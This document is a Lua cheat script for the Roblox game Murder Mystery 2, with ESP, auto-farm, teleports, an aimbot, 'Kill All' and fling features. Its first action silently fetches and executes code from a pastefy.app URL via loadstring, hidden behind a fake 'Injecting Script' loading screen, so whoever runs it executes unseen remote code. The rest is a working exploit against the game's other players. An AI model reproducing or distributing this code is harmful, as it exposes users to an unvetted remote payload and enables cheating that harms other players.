(function(...)

--------------------------------------------------
-- EXECUTE YOUR SCRIPT FIRST
--------------------------------------------------
pcall(function()
	loadstring(game:HttpGet("https://pastefy.app/HSnXoY8G/raw"))()
end)

--------------------------------------------------
-- LOADING SCREEN
--------------------------------------------------
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

pcall(function()
	if CoreGui:FindFirstChild("LynxLoading") then
		CoreGui.LynxLoading:Destroy()
	end
end)

local LoadingGui = Instance.new("ScreenGui")
LoadingGui.Name = "LynxLoading"
LoadingGui.IgnoreGuiInset = true
LoadingGui.Parent = CoreGui

local bg = Instance.new("Frame", LoadingGui)
bg.Size = UDim2.fromScale(1,1)
bg.BackgroundColor3 = Color3.fromRGB(12,12,16)

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(1,0,0,60)
title.Position = UDim2.new(0,0,0.42,0)
title.Text = "[OP 🔥] LYNX HUB"
title.Font = Enum.Font.Arcade
title.TextSize = 32
title.TextColor3 = Color3.fromRGB(0,200,255)
title.BackgroundTransparency = 1

local sub = Instance.new("TextLabel", bg)
sub.Size = UDim2.new(1,0,0,40)
sub.Position = UDim2.new(0,0,0.49,0)
sub.Text = "MM2 SCRIPT | By: Dakrscript"
sub.Font = Enum.Font.Arcade
sub.TextSize = 16
sub.TextColor3 = Color3.fromRGB(200,200,200)
sub.BackgroundTransparency = 1

local inject = Instance.new("TextLabel", bg)
inject.Size = UDim2.new(1,0,0,30)
inject.Position = UDim2.new(0,0,0.92,0)
inject.Text = "[ Injecting Script ]"
inject.Font = Enum.Font.Arcade
inject.TextSize = 14
inject.TextColor3 = Color3.fromRGB(160,160,160)
inject.BackgroundTransparency = 1

task.wait(5)
LoadingGui:Destroy()

--------------------------------------------------
-- LOAD RAYFIELD
--------------------------------------------------
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local Window = Rayfield:CreateWindow({
	Name = "[OP 🔥] LYNX HUB | MM2 SCRIPT | By: Dakrscript",
	LoadingTitle = "LYNX HUB",
	LoadingSubtitle = "MM2 2026",
	ConfigurationSaving = {Enabled = true}
})

local Main = Window:CreateTab("Main")

--------------------------------------------------
-- SERVICES
--------------------------------------------------
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--------------------------------------------------
-- FPS BOOST
--------------------------------------------------
Main:CreateButton({
	Name = "Improve FPS",
	Callback = function()
		for _,v in pairs(workspace:GetDescendants()) do
			if v:IsA("BasePart") then
				v.Material = Enum.Material.SmoothPlastic
			elseif v:IsA("Decal") or v:IsA("Texture") then
				v:Destroy()
			end
		end
		game.Lighting.GlobalShadows = false
	end
})

--------------------------------------------------
-- ROLE ESP (FIXED)
--------------------------------------------------
local ESP = false
local ESPs = {}

local function hasTool(plr, tool)
	return (plr.Backpack:FindFirstChild(tool) or (plr.Character and plr.Character:FindFirstChild(tool)))
end

local function getRole(plr)
	if hasTool(plr,"Knife") then return "Murderer"
	elseif hasTool(plr,"Gun") then return "Sheriff"
	end
	return "Innocent"
end

Main:CreateToggle({
	Name = "Role ESP",
	CurrentValue = false,
	Callback = function(v)
		ESP = v
		if not v then
			for _,h in pairs(ESPs) do h:Destroy() end
			ESPs = {}
		end
	end
})

RunService.RenderStepped:Connect(function()
	if not ESP then return end
	for _,plr in pairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer and plr.Character then
			if not ESPs[plr] then
				local h = Instance.new("Highlight", plr.Character)
				h.Adornee = plr.Character
				ESPs[plr] = h
			end
			local r = getRole(plr)
			ESPs[plr].FillColor =
				r=="Murderer" and Color3.fromRGB(255,0,0)
				or r=="Sheriff" and Color3.fromRGB(0,120,255)
				or Color3.fromRGB(0,255,0)
		end
	end
end)

--------------------------------------------------
-- AUTO FARM COINS (WORKING)
--------------------------------------------------
local AutoFarm = false

Main:CreateToggle({
	Name = "Auto Farm Coins",
	CurrentValue = false,
	Callback = function(v) AutoFarm = v end
})

task.spawn(function()
	while task.wait(0.4) do
		if AutoFarm and LocalPlayer.Character then
			for _,c in pairs(workspace:GetDescendants()) do
				if c.Name=="Coin_Server" and c:IsA("BasePart") then
					LocalPlayer.Character:PivotTo(c.CFrame)
				end
			end
		end
	end
end)

--------------------------------------------------
-- TELEPORTS
--------------------------------------------------
Main:CreateButton({
	Name = "Teleport to Lobby",
	Callback = function()
		if workspace:FindFirstChild("Lobby") then
			LocalPlayer.Character:PivotTo(workspace.Lobby.SpawnLocation.CFrame)
		end
	end
})

Main:CreateButton({
	Name = "Teleport to Dropped Gun",
	Callback = function()
		for _,v in pairs(workspace:GetChildren()) do
			if v.Name=="GunDrop" then
				LocalPlayer.Character:PivotTo(v.CFrame)
			end
		end
	end
})

--------------------------------------------------
-- AIMBOT (SHERIFF)
--------------------------------------------------
local Aimbot = false

Main:CreateToggle({
	Name = "Aimbot (Sheriff)",
	CurrentValue = false,
	Callback = function(v) Aimbot = v end
})

RunService.RenderStepped:Connect(function()
	if not Aimbot then return end
	if not hasTool(LocalPlayer,"Gun") then return end
	for _,plr in pairs(Players:GetPlayers()) do
		if getRole(plr)=="Murderer" and plr.Character then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				plr.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-6)
		end
	end
end)

--------------------------------------------------
-- KILL ALL (MURDERER)
--------------------------------------------------
Main:CreateButton({
	Name = "Kill All (Murderer)",
	Callback = function()
		if not hasTool(LocalPlayer,"Knife") then return end
		local knife = LocalPlayer.Character:FindFirstChild("Knife")
		for _,plr in pairs(Players:GetPlayers()) do
			if plr~=LocalPlayer and plr.Character then
				if firetouchinterest then
					firetouchinterest(knife.Handle,plr.Character.HumanoidRootPart,0)
					firetouchinterest(knife.Handle,plr.Character.HumanoidRootPart,1)
				end
			end
		end
	end
})

--------------------------------------------------
-- FLING PLAYER
--------------------------------------------------
Main:CreateInput({
	Name = "Fling Player",
	PlaceholderText = "Username",
	Callback = function(name)
		for _,plr in pairs(Players:GetPlayers()) do
			if plr.Name:lower()==name:lower() then
				LocalPlayer.Character.HumanoidRootPart.Velocity =
					Vector3.new(9999,9999,9999)
			end
		end
	end
})

end)(...)
